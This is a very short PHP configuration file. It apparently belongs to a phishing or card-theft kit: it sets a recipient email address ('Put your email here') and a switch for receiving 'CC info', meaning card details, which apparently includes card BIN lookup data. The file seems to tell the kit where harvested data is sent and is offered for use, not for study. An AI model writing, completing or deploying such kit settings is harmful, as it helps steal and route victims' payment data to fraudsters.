<?php

$to = "dev0root@gmail.com"; // Put your email here
$BIN_INFO = "no"; // if you want CC info Message make it "yes"

?>